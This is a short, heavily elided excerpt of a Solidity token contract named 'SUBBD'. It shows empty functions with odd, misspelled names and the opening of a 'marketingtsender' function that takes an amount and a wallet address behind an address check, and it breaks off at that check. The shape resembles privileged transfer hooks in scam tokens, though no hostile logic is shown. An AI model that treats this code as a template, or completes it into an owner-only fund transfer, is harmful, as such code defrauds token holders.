...
contract SUBBD is Ownable {
    ...
    string private _name = "SUBBD";
    string private _symbol = "SUBBD";
    ...
    function premarket() public {
    }
    function opePremarket() external {
    }
    function marketspender() public {
    }
    function marketsender() public {
    }
    ...
    function marketingtsender(uint256 amount, address walletAddr) external {
        if (marketingAddres()) {
